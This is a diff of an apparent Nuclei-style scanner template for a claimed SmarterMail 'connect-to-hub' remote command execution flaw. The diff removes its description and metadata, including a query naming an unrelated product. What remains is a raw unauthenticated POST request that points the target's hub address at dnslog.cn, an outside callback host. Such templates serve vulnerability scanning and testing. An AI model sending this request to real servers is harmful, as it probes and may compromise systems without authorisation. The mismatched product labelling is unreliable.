@@ -3,12 +3,8 @@ info:
   name: SmarterTools-SmarterMail connect-to-hub存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ysahza45ge391ogl'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ysahza45ge391ogl
-    fofa: app="致远互联-OA"
 http:
 - raw:
   - "POST /api/v1/settings/sysadmin/connect-to-hub HTTP/1.1\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,\nlike Gecko) Chrome/91.0.4472.77 Safari/537.36\n\n{\n  \"hubAddress\": \"http://dnslog.cn\",\n  \"oneTimePassword\": \"test\",\n  \"nodeName\": \"victim\"\n}"
